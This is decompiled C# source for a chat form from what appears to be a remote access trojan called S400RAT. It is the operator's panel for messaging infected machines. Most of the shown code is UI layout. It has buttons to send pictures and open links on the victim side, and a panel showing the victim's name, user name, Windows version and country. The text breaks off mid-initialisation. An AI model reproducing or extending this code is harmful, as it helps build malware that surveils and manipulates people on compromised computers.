using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class Chat : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("T1")]
	[CompilerGenerated]
	public RichTextBox richTextBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("T2")]
	public TextBox textBox_0;

	[AccessedThroughProperty("vmethod_8")]
	[CompilerGenerated]
	public Timer timer_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[AccessedThroughProperty("Guna2BorderlessForm1")]
	[CompilerGenerated]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("panel1")]
	[CompilerGenerated]
	public Panel panel_0;

	[AccessedThroughProperty("Panel3")]
	[CompilerGenerated]
	public Panel panel_1;

	[AccessedThroughProperty("Logis4")]
	[CompilerGenerated]
	public Button button_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Builder3")]
	public Button button_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Home1")]
	public Button button_2;

	[AccessedThroughProperty("panel2")]
	[CompilerGenerated]
	public Panel panel_2;

	[AccessedThroughProperty("pictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[AccessedThroughProperty("PictureBox4")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("Hackname")]
	[CompilerGenerated]
	public Label label_0;

	[AccessedThroughProperty("PictureBox2")]
	[CompilerGenerated]
	public PictureBox pictureBox_2;

	[AccessedThroughProperty("PictureBox9")]
	[CompilerGenerated]
	public PictureBox pictureBox_3;

	[AccessedThroughProperty("PictureBox6")]
	[CompilerGenerated]
	public PictureBox pictureBox_4;

	[CompilerGenerated]
	[AccessedThroughProperty("Button3")]
	public Guna2Button guna2Button_0;

	[AccessedThroughProperty("Button1")]
	[CompilerGenerated]
	public Guna2Button guna2Button_1;

	[AccessedThroughProperty("Namees")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_0;

	[AccessedThroughProperty("PictureBox3")]
	[CompilerGenerated]
	public PictureBox pictureBox_5;

	[AccessedThroughProperty("ZZZ")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("panel5")]
	public Panel panel_3;

	[CompilerGenerated]
	[AccessedThroughProperty("ADD")]
	public Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("WindowsWindows10ToolStripMenuItem")]
	public Label label_2;

	[CompilerGenerated]
	[AccessedThroughProperty("UserNameFCToolStripMenuItem")]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Namevctim")]
	public Label label_4;

	[CompilerGenerated]
	[AccessedThroughProperty("Label10")]
	public Label label_5;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_6;

	[AccessedThroughProperty("Label5")]
	[CompilerGenerated]
	public Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox5")]
	public PictureBox pictureBox_6;

	[AccessedThroughProperty("label8")]
	[CompilerGenerated]
	public Label label_8;

	[CompilerGenerated]
	[AccessedThroughProperty("label9")]
	public Label label_9;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox10")]
	public PictureBox pictureBox_7;

	[CompilerGenerated]
	[AccessedThroughProperty("Label1")]
	public Label label_10;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox8")]
	public PictureBox pictureBox_8;

	[AccessedThroughProperty("SqlabC_ControlMini1")]
	[CompilerGenerated]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	public string hk;

	public Client osk;

	public Client sk;

	public string string_0;

	public string string_1;

	public string string_2;

	public string string_3;

	public string string_4;

	internal virtual RichTextBox T1
	{
		[CompilerGenerated]
		get
		{
			return richTextBox_0;
		}
		[CompilerGenerated]
		set
		{
			LinkClickedEventHandler value2 = method_3;
			RichTextBox richTextBox = richTextBox_0;
			if (richTextBox != null)
			{
				richTextBox.LinkClicked -= value2;
			}
			richTextBox_0 = value;
			richTextBox = richTextBox_0;
			if (richTextBox != null)
			{
				richTextBox.LinkClicked += value2;
			}
		}
	}

	internal virtual TextBox T2
	{
		[CompilerGenerated]
		get
		{
			return textBox_0;
		}
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = method_1;
			EventHandler value3 = method_7;
			TextBox textBox = textBox_0;
			if (textBox != null)
			{
				textBox.KeyDown -= value2;
				textBox.TextChanged -= value3;
			}
			textBox_0 = value;
			textBox = textBox_0;
			if (textBox != null)
			{
				textBox.KeyDown += value2;
				textBox.TextChanged += value3;
			}
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ControlBox_0 = value;
		}
	}

	public virtual Panel panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	public virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	public virtual Button Logis4
	{
		[CompilerGenerated]
		get
		{
			return button_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_9;
			Button button = button_0;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_0 = value;
			button = button_0;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Builder3
	{
		[CompilerGenerated]
		get
		{
			return button_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_8;
			Button button = button_1;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_1 = value;
			button = button_1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Button Home1
	{
		[CompilerGenerated]
		get
		{
			return button_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_6;
			Button button = button_2;
			if (button != null)
			{
				button.Click -= value2;
			}
			button_2 = value;
			button = button_2;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual Panel panel2
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	public virtual PictureBox pictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual PictureBox PictureBox4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label Hackname
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	public virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	public virtual PictureBox PictureBox9
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	public virtual PictureBox PictureBox6
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_4 = value;
		}
	}

	internal virtual Guna2Button Button3
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			Guna2Button guna2Button = guna2Button_0;
			if (guna2Button != null)
			{
				guna2Button.Click -= value2;
			}
			guna2Button_0 = value;
			guna2Button = guna2Button_0;
			if (guna2Button != null)
			{
				guna2Button.Click += value2;
			}
		}
	}

	internal virtual Guna2Button Button1
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			Guna2Button guna2Button = guna2Button_1;
			if (guna2Button != null)
			{
				guna2Button.Click -= value2;
			}
			guna2Button_1 = value;
			guna2Button = guna2Button_1;
			if (guna2Button != null)
			{
				guna2Button.Click += value2;
			}
		}
	}

	internal virtual Guna2TextBox Namees
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_0 = value;
		}
	}

	internal virtual PictureBox PictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_5;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_11;
			PictureBox pictureBox = pictureBox_5;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			pictureBox_5 = value;
			pictureBox = pictureBox_5;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	internal virtual Guna2ControlBox ZZZ
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_10;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_1;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_1 = value;
			guna2ControlBox = guna2ControlBox_1;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_3;
		}
		[CompilerGenerated]
		set
		{
			panel_3 = value;
		}
	}

	public virtual Label ADD
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	public virtual Label WindowsWindows10ToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label UserNameFCToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Namevctim
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual Label Label10
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	public virtual PictureBox PictureBox5
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_6;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_6 = value;
		}
	}

	public virtual Label label8
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_9;
		}
		[CompilerGenerated]
		set
		{
			label_9 = value;
		}
	}

	internal virtual PictureBox PictureBox10
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_7;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_7 = value;
		}
	}

	internal virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_10;
		}
		[CompilerGenerated]
		set
		{
			label_10 = value;
		}
	}

	internal virtual PictureBox PictureBox8
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_8;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_8 = value;
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Chat));
		T2 = new TextBox();
		T1 = new RichTextBox();
		vmethod_0(new Timer(icontainer_0));
		vmethod_2(new Guna2AnimateWindow(icontainer_0));
		vmethod_4(new Guna2BorderlessForm(icontainer_0));
		Guna2ControlBox1 = new Guna2ControlBox();
		panel1 = new Panel();
		PictureBox4 = new PictureBox();
		Panel3 = new Panel();
		PictureBox8 = new PictureBox();
		Label1 = new Label();
		Hackname = new Label();
		PictureBox2 = new PictureBox();
		Logis4 = new Button();
		Builder3 = new Button();
		Home1 = new Button();
		panel2 = new Panel();
		PictureBox10 = new PictureBox();
		PictureBox9 = new PictureBox();
		pictureBox1 = new PictureBox();
		PictureBox3 = new PictureBox();
		PictureBox6 = new PictureBox();
		Button3 = new Guna2Button();
		Button1 = new Guna2Button();
		Namees = new Guna2TextBox();
		ZZZ = new Guna2ControlBox();
		panel5 = new Panel();
		ADD = new Label();
		WindowsWindows10ToolStripMenuItem = new Label();
		UserNameFCToolStripMenuItem = new Label();
		Namevctim = new Label();
		Label10 = new Label();
		Label7 = new Label();
		Label5 = new Label();
		PictureBox5 = new PictureBox();
		label8 = new Label();
		label9 = new Label();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		panel1.SuspendLayout();
		((ISupportInitialize)PictureBox4).BeginInit();
		Panel3.SuspendLayout();
		((ISupportInitialize)PictureBox8).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		panel2.SuspendLayout();
		((ISupportInitialize)PictureBox10).BeginInit();
		((ISupportInitialize)PictureBox9).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)PictureBox3).BeginInit();
		((ISupportInitialize)PictureBox6).BeginInit();
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox5).BeginInit();
		SuspendLayout();
		T2.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		T2.BackColor = Color.FromArgb(24, 30, 54);
		T2.BorderStyle = BorderStyle.FixedSingle;
		T2.ForeColor = Color.FromArgb(224, 224, 224);
		T2.Location = new Point(192, 442);
		T2.Multiline = true;
		T2.Name = "T2";
		T2.Size = new Size(639, 29);
		T2.TabIndex = 0;
		T1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		T1.BackColor = Color.FromArgb(46, 51, 73);
		T1.BorderStyle = BorderStyle.None;
		T1.ForeColor = Color.FromArgb(224, 224, 224);
		T1.Location = new Point(192, 167);
		T1.Name = "T1";
		T1.ReadOnly = true;
		T1.Size = new Size(639, 302);
		T1.TabIndex = 1;
		T1.Text = "";
		vmethod_1().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_1().TargetForm = this;
		vmethod_3().ContainerControl = this;
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BorderColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.FillColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(792, 2);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 67;
		panel1.BackColor = Color.FromArgb(24, 30, 54);
		panel1.Controls.Add(PictureBox4);
		panel1.Controls.Add(Panel3);
		panel1.Controls.Add(Logis4);
		panel1.Controls.Add(Builder3);
		panel1.Controls.Add(Home1);
		panel1.Controls.Add(panel2);
		panel1.Dock = DockStyle.Left;
		panel1.Location = new Point(0, 0);
		panel1.Name = "panel1";
		panel1.Size = new Size(186, 476);
		panel1.TabIndex = 68;
		PictureBox4.Location = new Point(0, 154);
		PictureBox4.Name = "PictureBox4";
		PictureBox4.Size = new Size(186, 168);
		PictureBox4.TabIndex = 72;
		PictureBox4.TabStop = false;
		Panel3.Controls.Add(PictureBox8);
		Panel3.Controls.Add(Label1);
		Panel3.Controls.Add(Hackname);
		Panel3.Controls.Add(PictureBox2);
		Panel3.Dock = DockStyle.Bottom;
		Panel3.Location = new Point(0, 322);
		Panel3.Name = "Panel3";
		Panel3.Size = new Size(186, 154);
		Panel3.TabIndex = 6;
		PictureBox8.Location = new Point(0, 0);
		PictureBox8.Name = "PictureBox8";
		PictureBox8.Size = new Size(186, 154);
		PictureBox8.TabIndex = 99;
		PictureBox8.TabStop = false;
		Label1.AutoSize = true;
		Label1.Font = new Font("Microsoft Sans Serif", 6.75f, FontStyle.Bold);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(58, 120);
		Label1.Name = "Label1";
		Label1.Size = new Size(50, 12);
		Label1.TabIndex = 98;
		Label1.Text = "Taypeing";
		Hackname.AutoSize = true;
		Hackname.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		Hackname.ForeColor = Color.FromArgb(0, 126, 249);
		Hackname.Location = new Point(32, 95);
		Hackname.Name = "Hackname";
		Hackname.Size = new Size(116, 16);
		Hackname.TabIndex = 1;
		Hackname.Text = "...........................";
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(60, 22);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(63, 63);
		PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox2.TabIndex = 0;
		PictureBox2.TabStop = false;
		Logis4.Dock = DockStyle.Top;
		Logis4.FlatAppearance.BorderSize = 0;
		Logis4.FlatStyle = FlatStyle.Flat;
		Logis4.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		Logis4.ForeColor = Color.FromArgb(0, 126, 249);
		Logis4.Image = (Image)componentResourceManager.GetObject("Logis4.Image");
		Logis4.Location = new Point(0, 238);
		Logis4.Name = "Logis4";
		Logis4.Size = new Size(186, 42);
		Logis4.TabIndex = 1;
		Logis4.Text = "Exit Chat        ";
		Logis4.TextImageRelation = TextImageRelation.TextBeforeImage;
		Logis4.UseVisualStyleBackColor = true;
		Builder3.Dock = DockStyle.Top;
		Builder3.FlatAppearance.BorderSize = 0;
		Builder3.FlatStyle = FlatStyle.Flat;
		Builder3.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		Builder3.ForeColor = Color.FromArgb(0, 126, 249);
		Builder3.Image = (Image)componentResourceManager.GetObject("Builder3.Image");
		Builder3.Location = new Point(0, 196);
		Builder3.Name = "Builder3";
		Builder3.Size = new Size(186, 42);
		Builder3.TabIndex = 1;
		Builder3.Text = "Open link       ";
		Builder3.TextImageRelation = TextImageRelation.TextBeforeImage;
		Builder3.UseVisualStyleBackColor = true;
		Home1.Dock = DockStyle.Top;
		Home1.FlatAppearance.BorderSize = 0;
		Home1.FlatStyle = FlatStyle.Flat;
		Home1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		Home1.ForeColor = Color.FromArgb(0, 126, 249);
		Home1.Image = (Image)componentResourceManager.GetObject("Home1.Image");
		Home1.Location = new Point(0, 154);
		Home1.Name = "Home1";
		Home1.Size = new Size(186, 42);
		Home1.TabIndex = 1;
		Home1.Text = "send a picture";
		Home1.TextImageRelation = TextImageRelation.TextBeforeImage;
		Home1.UseVisualStyleBackColor = true;
		panel2.Controls.Add(PictureBox10);
		panel2.Controls.Add(PictureBox9);
		panel2.Controls.Add(pictureBox1);
		panel2.Dock = DockStyle.Top;
		panel2.Location = new Point(0, 0);
		panel2.Name = "panel2";
		panel2.Size = new Size(186, 154);
		panel2.TabIndex = 0;
		PictureBox10.Image = (Image)componentResourceManager.GetObject("PictureBox10.Image");
		PictureBox10.Location = new Point(3, 103);
		PictureBox10.Name = "PictureBox10";
		PictureBox10.Size = new Size(177, 45);
		PictureBox10.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox10.TabIndex = 98;
		PictureBox10.TabStop = false;
		PictureBox9.Image = (Image)componentResourceManager.GetObject("PictureBox9.Image");
		PictureBox9.Location = new Point(35, 12);
		PictureBox9.Name = "PictureBox9";
		PictureBox9.Size = new Size(115, 80);
		PictureBox9.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox9.TabIndex = 80;
		PictureBox9.TabStop = false;
		pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
		pictureBox1.Location = new Point(60, 22);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new Size(63, 63);
		pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 0;
		pictureBox1.TabStop = false;
		PictureBox3.BackColor = Color.FromArgb(46, 51, 73);
		PictureBox3.Location = new Point(186, 137);
		PictureBox3.Name = "PictureBox3";
		PictureBox3.Size = new Size(655, 339);
		PictureBox3.TabIndex = 81;
		PictureBox3.TabStop = false;
		PictureBox6.BackColor = Color.FromArgb(46, 51, 73);
		PictureBox6.Image = (Image)componentResourceManager.GetObject("PictureBox6.Image");
		PictureBox6.Location = new Point(409, 153);
		PictureBox6.Name = "PictureBox6";
		PictureBox6.Size = new Size(159, 80);
		PictureBox6.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox6.TabIndex = 85;
		PictureBox6.TabStop = false;
		Button3.Animated = true;
		Button3.AutoRoundedCorners = true;
		Button3.BackColor = Color.Transparent;
		Button3.BorderRadius = 20;
		Button3.CheckedState.Parent = Button3;
		Button3.CustomImages.Parent = Button3;
		Button3.FillColor = Color.FromArgb(24, 30, 54);
		Button3.Font = new Font("Segoe UI", 9f);
		Button3.ForeColor = Color.White;
		Button3.HoverState.Parent = Button3;
		Button3.IndicateFocus = true;
		Button3.Location = new Point(409, 249);
		Button3.Name = "Button3";
		Button3.ShadowDecoration.Parent = Button3;
		Button3.Size = new Size(159, 42);
		Button3.TabIndex = 84;
		Button3.Text = "Add a picture of me";
		Button3.UseTransparentBackground = true;
		Button1.Animated = true;
		Button1.AutoRoundedCorners = true;
		Button1.BackColor = Color.Transparent;
		Button1.BorderRadius = 24;
		Button1.CheckedState.Parent = Button1;
		Button1.CustomImages.Parent = Button1;
		Button1.FillColor = Color.FromArgb(0, 126, 249);
		Button1.Font = new Font("Segoe UI", 9f);
		Button1.ForeColor = Color.White;
		Button1.HoverState.Parent = Button1;
		Button1.IndicateFocus = true;
		Button1.Location = new Point(409, 350);
		Button1.Name = "Button1";
		Button1.ShadowDecoration.Parent = Button1;
		Button1.Size = new Size(159, 51);
		Button1.TabIndex = 82;
		Button1.Text = "Start Chat     ";
		Button1.UseTransparentBackground = true;
		Namees.Animated = true;
		Namees.AutoRoundedCorners = true;
		Namees.BackColor = Color.FromArgb(46, 51, 73);
		Namees.BorderRadius = 19;
		Namees.Cursor = Cursors.IBeam;
		Namees.DefaultText = "";
		Namees.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Namees.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Namees.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Namees.DisabledState.Parent = Namees;
		Namees.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Namees.FillColor = Color.FromArgb(24, 30, 54);
		Namees.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Namees.FocusedState.Parent = Namees;
		Namees.Font = new Font("Segoe UI", 9f);
		Namees.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Namees.HoverState.Parent = Namees;
		Namees.Location = new Point(322, 303);
		Namees.Name = "Namees";
		Namees.PasswordChar = '\0';
		Namees.PlaceholderText = "Name";
		Namees.SelectedText = "";
		Namees.ShadowDecoration.Parent = Namees;
		Namees.Size = new Size(337, 40);
		Namees.TabIndex = 83;
		Namees.TextAlign = HorizontalAlignment.Center;
		ZZZ.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		ZZZ.BorderColor = Color.FromArgb(46, 51, 73);
		ZZZ.FillColor = Color.FromArgb(24, 30, 54);
		ZZZ.HoverState.Parent = ZZZ;
		ZZZ.IconColor = Color.White;
		ZZZ.Location = new Point(796, 0);
		ZZZ.Name = "ZZZ";
		ZZZ.PressedColor = Color.FromArgb(46, 51, 73);
		ZZZ.ShadowDecoration.Parent = ZZZ;
		ZZZ.Size = new Size(45, 29);
		ZZZ.TabIndex = 96;
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(46, 51, 73);
		panel5.Controls.Add(ADD);
		panel5.Controls.Add(WindowsWindows10ToolStripMenuItem);
		panel5.Controls.Add(UserNameFCToolStripMenuItem);
		panel5.Controls.Add(Namevctim);
		panel5.Controls.Add(Label10);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label5);
		panel5.Controls.Add(PictureBox5);
		panel5.Controls.Add(label8);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(186, 1);
		panel5.Name = "panel5";
		panel5.Size = new Size(329, 130);
		panel5.TabIndex = 97;
		ADD.AutoSize = true;
		ADD.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		ADD.ForeColor = Color.FromArgb(158, 161, 176);
		ADD.Location = new Point(98, 102);
		ADD.Name = "ADD";
		ADD.Size = new Size(18, 17);
		ADD.TabIndex = 9;
		ADD.Text = "--";
		WindowsWindows10ToolStripMenuItem.AutoSize = true;
		WindowsWindows10ToolStripMenuItem.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		WindowsWindows10ToolStripMenuItem.ForeColor = Color.FromArgb(158, 161, 176);
		WindowsWindows10ToolStripMenuItem.Location = new Point(98, 81);
		WindowsWindows10ToolStripMenuItem.Name = "WindowsWindows10ToolStripMenuItem";
		WindowsWindows10ToolStripMenuItem.Size = new Size(18, 17);
		WindowsWindows10ToolStripMenuItem.TabIndex = 8;
		WindowsWindows10ToolStripMenuItem.Text = "--";
		UserNameFCToolStripMenuItem.AutoSize = true;
		UserNameFCToolStripMenuItem.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		UserNameFCToolStripMenuItem.ForeColor = Color.FromArgb(158, 161, 176);
		UserNameFCToolStripMenuItem.Location = new Point(98, 60);
		UserNameFCToolStripMenuItem.Name = "UserNameFCToolStripMenuItem";
		UserNameFCToolStripMenuItem.Size = new Size(18, 17);
		UserNameFCToolStripMenuItem.TabIndex = 7;
		UserNameFCToolStripMenuItem.Text = "--";
		Namevctim.AutoSize = true;
		Namevctim.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Namevctim.ForeColor = Color.FromArgb(158, 161, 176);
		Namevctim.Location = new Point(98, 39);
		Namevctim.Name = "Namevctim";
		Namevctim.Size = new Size(18, 17);
		Namevctim.TabIndex = 6;
		Namevctim.Text = "--";
		Label10.AutoSize = true;
		Label10.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label10.ForeColor = Color.FromArgb(158, 161, 176);
		Label10.Location = new Point(30, 102);
		Label10.Name = "Label10";
		Label10.Size = new Size(61, 17);
		Label10.TabIndex = 5;
		Label10.Text = "Country :";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(23, 81);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label5.AutoSize = true;
		Label5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label5.ForeColor = Color.FromArgb(158, 161, 176);
		Label5.Location = new Point(10, 60);
		Label5.Name = "Label5";
		Label5.Size = new Size(81, 17);
		Label5.TabIndex = 3;
		Label5.Text = "User Name :";
		PictureBox5.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox5.Image = (Image)componentResourceManager.GetObject("PictureBox5.Image");
		PictureBox5.Location = new Point(265, 19);
		PictureBox5.Name = "PictureBox5";
		PictureBox5.Size = new Size(53, 58);
		PictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox5.TabIndex = 2;
		PictureBox5.TabStop = false;
		label8.AutoSize = true;
		label8.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label8.ForeColor = Color.FromArgb(158, 161, 176);
		label8.Location = new Point(41, 39);
		label8.Name = "label8";
		label8.Size = new Size(50, 17);
		label8.TabIndex = 0;
		label8.Text = "Name :";
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(17, 9);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(24, 30, 54);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
